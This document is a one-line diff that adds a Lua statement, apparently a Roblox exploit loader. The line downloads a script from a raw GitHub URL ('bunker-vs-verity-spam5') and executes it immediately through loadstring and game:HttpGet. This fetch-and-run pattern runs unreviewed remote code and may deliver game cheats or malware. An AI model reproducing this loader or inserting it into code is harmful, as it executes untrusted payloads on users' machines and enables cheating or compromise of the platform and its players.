@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/bunker-vs-verity-spam5-3nl9gev4fixj8c.lua"))()
